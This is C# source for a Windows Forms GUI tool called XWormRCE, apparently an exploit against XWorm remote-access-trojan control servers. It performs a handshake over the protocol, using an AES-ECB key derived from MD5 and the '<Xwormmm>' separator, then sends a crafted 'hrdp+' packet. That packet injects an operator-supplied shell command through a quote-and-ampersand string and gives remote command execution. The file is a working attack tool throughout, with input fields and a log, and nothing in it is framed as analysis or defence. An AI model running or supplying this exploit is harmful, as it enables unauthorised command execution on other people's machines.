using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace XWormRCE
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        static string GenId(int length = 8)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        static byte[] Pad(byte[] data, int blockSize)
        {
            int padding = blockSize - (data.Length % blockSize);
            byte[] padded = new byte[data.Length + padding];
            data.CopyTo(padded, 0);
            for (int i = data.Length; i < padded.Length; i++)
            {
                padded[i] = (byte)padding;
            }
            return padded;
        }

        static byte[] SendPacket(Socket sock, Packet packet, string key)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                byte[] keyHash = md5.ComputeHash(keyBytes);

                byte[] data = packet.GetBytes();
                byte[] encrypted;

                using (Aes aes = Aes.Create())
                {
                    aes.Key = keyHash;
                    aes.Mode = CipherMode.ECB;
                    aes.Padding = PaddingMode.PKCS7;

                    using (ICryptoTransform encryptor = aes.CreateEncryptor())
                    {
                        encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);
                    }
                }

                byte[] lengthBytes = Encoding.UTF8.GetBytes(encrypted.Length.ToString());
                byte[] finalLengthBytes = new byte[lengthBytes.Length + 1];
                Buffer.BlockCopy(lengthBytes, 0, finalLengthBytes, 0, lengthBytes.Length);
                finalLengthBytes[lengthBytes.Length] = 0x00;

                sock.Send(finalLengthBytes);
                sock.Send(encrypted);
                return encrypted;
            }
        }

        private bool ExecuteRCE(string host, int port, string command, string key = "<123456789>",  string constring = "127.0.0.1:1488")
        {
            string clientId = GenId();
            AppendLog($"[+] Connecting to server with id={clientId}");
            var sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            sock.ReceiveTimeout = 10000;
            sock.SendTimeout = 10000;
            sock.Connect(host, port);
            AppendLog($"[+] Connected to server! Sending Auth Payload...");
            var handshakePacket = new Packet(
                Encoding.UTF8.GetBytes("hrdp"),
                Encoding.UTF8.GetBytes(clientId)
            );
            SendPacket(sock, handshakePacket, key);
            Thread.Sleep(500);

            AppendLog($"[+] Sending Exploit Payload...");

            var exploitPacket = new Packet(
                Encoding.UTF8.GetBytes("hrdp+"),
                Encoding.UTF8.GetBytes(clientId),
                Encoding.UTF8.GetBytes(" lol"),
                Encoding.UTF8.GetBytes("\" & " + command),
                Encoding.UTF8.GetBytes(constring)
            );
            SendPacket(sock, exploitPacket, key);

            AppendLog($"[+] RCE Payload Sent! Closing Socket...");

            sock.Shutdown(SocketShutdown.Both);
            sock.Close();
            AppendLog($"[+] RCE Completed!");
            return true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
        }
        private void AppendLog(string text)
        {
            Invoke(new Action(() => { logBox.AppendText(text + Environment.NewLine); }));

        }
        private void exploitButton_Click(object sender, EventArgs e)
        {
            logBox.Clear();
            if (string.IsNullOrWhiteSpace(hostInput.Text))
            {
                hostInput.Focus();
                AppendLog("[!] Fill all required fields!");
                return;
            }
            if (string.IsNullOrWhiteSpace(keyInput.Text))
            {
                keyInput.Focus();
                AppendLog("[!] Fill all required fields!");
                return;
            }
            if (string.IsNullOrWhiteSpace(commandInput.Text))
            {
                commandInput.Focus();
                AppendLog("[!] Fill all required fields!");
                return;
            }

            exploitButton.Enabled = false;
            hostInput.Enabled = false;
            portInput.Enabled = false;
            keyInput.Enabled = false;
            commandInput.Enabled = false;
            AppendLog("[+] RCE Execution Begin");
            Task.Run(() =>
            {
                try
                {
                    ExecuteRCE(hostInput.Text, (int)portInput.Value, commandInput.Text, key: keyInput.Text);
                }
                catch (Exception ex) 
                { 
                    AppendLog($"[X] An error has occurred: {ex.Message}"); 
                }

            }).ContinueWith((a) =>
            {
                Invoke(new Action(() =>
                {
                    exploitButton.Enabled = true;
                    hostInput.Enabled = true;
                    portInput.Enabled = true;
                    keyInput.Enabled = true;
                    commandInput.Enabled = true;
                }));
            });
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }

    class Packet
    {
        private List<byte[]> _data;

        public Packet(params byte[][] data)
        {
            _data = new List<byte[]>(data);
        }

        public void WriteBytes(Stream stream)
        {
            byte[] separator = Encoding.UTF8.GetBytes("<Xwormmm>");
            for (int i = 0; i < _data.Count; i++)
            {
                stream.Write(_data[i], 0, _data[i].Length);
                if (i < _data.Count - 1)
                {
                    stream.Write(separator, 0, separator.Length);
                }
            }
        }

        public byte[] GetBytes()
        {
            using (var ms = new MemoryStream())
            {
                WriteBytes(ms);
                return ms.ToArray();
            }
        }
    }
}

